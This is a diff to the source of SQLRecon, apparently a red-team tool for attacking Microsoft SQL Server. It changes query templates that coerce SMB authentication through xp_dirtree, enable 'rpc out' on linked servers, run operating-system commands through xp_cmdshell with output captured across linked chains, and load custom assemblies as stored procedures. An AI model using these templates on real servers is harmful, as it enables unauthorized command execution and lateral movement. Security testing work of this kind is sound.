@@ -177,8 +177,11 @@ namespace SQLRecon.Commands
         internal static readonly string LinkedSmbRequest = "SELECT 1; EXEC master..xp_dirtree \"{0}\";";
         
         internal static readonly string LinkedToggleModule = "sp_configure '{0}', {1}; RECONFIGURE;";
-        
-        internal static readonly string LinkedXpCmd = "SELECT 1; exec master..xp_cmdshell '{0}'";
+
+        internal static readonly string LinkedToggleRpc = "EXEC sp_serveroption '{0}', 'rpc out', '{1}';";
+
+        //Capturing the result set allows to get the output over a linked chain
+        internal static readonly string LinkedXpCmd = "exec master..xp_cmdshell '{0}' WITH RESULT SETS ((Column1 NVARCHAR(MAX)))";
         
         internal static readonly string LoadDllIntoStoredProcedure = "CREATE PROCEDURE [dbo].[{0}] AS EXTERNAL NAME [{1}].[StoredProcedures].[{0}];";
         
